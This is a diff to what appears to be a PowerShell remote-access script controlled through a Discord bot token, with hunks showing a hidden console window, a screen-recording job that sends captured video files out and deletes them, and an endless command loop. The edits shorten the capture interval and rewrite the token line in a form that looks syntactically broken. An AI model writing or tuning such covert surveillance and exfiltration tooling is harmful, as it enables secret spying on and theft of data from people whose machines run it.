@@ -1,6 +1,6 @@
 
 # =====================================================================================================================================================
-$global:token = $env:BOT_TOKEN # make sure your bot is in ONE server only
+$global:token = $env:BOT_TOKEN='$token' # make sure your bot is in ONE server only
 # =============================================================== SCRIPT SETUP =========================================================================
 
 $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
@@ -1657,7 +1657,7 @@ $screenJob = {
         sendFile -sendfilePath $mkvPath | Out-Null
         sleep 5
         rm -Path $mkvPath -Force
-        sleep 10
+        sleep 1
     }
 }
 
@@ -1896,9 +1896,5 @@ while ($true) {
     }
     Sleep 3
 }
-
-
-
-
 
 
